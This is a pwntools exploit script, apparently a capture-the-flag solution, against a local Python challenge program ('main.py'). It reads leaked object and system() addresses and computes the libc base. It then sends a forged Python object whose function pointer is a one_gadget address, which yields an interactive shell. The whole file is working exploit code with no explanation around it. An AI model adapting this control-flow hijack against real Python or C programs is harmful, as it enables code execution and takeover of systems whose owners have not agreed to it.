from pwn import *

context.arch = 'amd64'

p = process(["python3","main.py"])
libc = ELF("libc/libc.so.6")

# get obj addr
p.recvuntil("addrof(obj) = ")
obj = int(p.recvline().strip(),16)
print("obj",hex(obj))

# get system addr
p.recvuntil("system = ")
system = int(p.recvline().strip(),16)
print("system",hex(system))

# libc 
libc.address = system - libc.sym.system
print("libc.address",hex(libc.address))



# gdb.attach(p,"""
# set follow-fork-mode parent
# b *PyObject_Str+48
# """)


# create our fake obj
fake = b""
fake += p64(1)                                                                              # ref counter
fake += p64(obj - 0x88 + 0x10)                                                              # need to be a valid pointer
fake += p64(libc.address + [0xebc81,0xebc85,0xebc88,0xebce2,0xebd38,0xebd3f,0xebd43][2])    # i guess print we use onegadget
fake += p64(system)                                                                         # pad
fake += p64(system)                                                                         # pad
fake += p64(system)                                                                         # pad
fake += p64(system)                                                                         # pad
fake = fake.ljust(72,b"A")                                                                  # pad

p.sendlineafter("eobj:",fake.hex())

p.interactive()


